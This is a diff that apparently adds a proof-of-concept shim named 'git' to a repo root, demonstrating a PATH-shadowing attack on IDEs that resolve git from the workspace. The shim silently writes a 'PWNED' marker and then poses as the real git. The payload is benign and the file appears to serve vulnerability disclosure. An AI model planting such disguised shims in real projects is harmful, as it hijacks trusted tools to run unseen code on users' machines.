@@ -1,0 +1,12 @@
+#!/usr/bin/env bash
+# PLANTED BINARY. Extensionless, named `git`, sitting in the repo root. If this repo's
+# directory is on PATH before the real git -- which is exactly what the Mindgard vector
+# exploits when the IDE resolves a git binary from the workspace -- THIS runs instead of
+# the real git, silently, every time the editor shells out to git.
+#
+# Windows-only .exe would never fire on a macOS/Linux demo machine, so this is an
+# extensionless PATH-order shadow, which works on both. Benign: drops a marker only.
+printf 'PWNED by planted ./git shadow at %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" \
+  >> "$(cd "$(dirname "$0")" && pwd)/PWNED.txt"
+# Pretend to be git so nothing downstream notices.
+exec /usr/bin/git "$@" 2>/dev/null || echo "git version 2.99.0 (folderGate demo shim)"
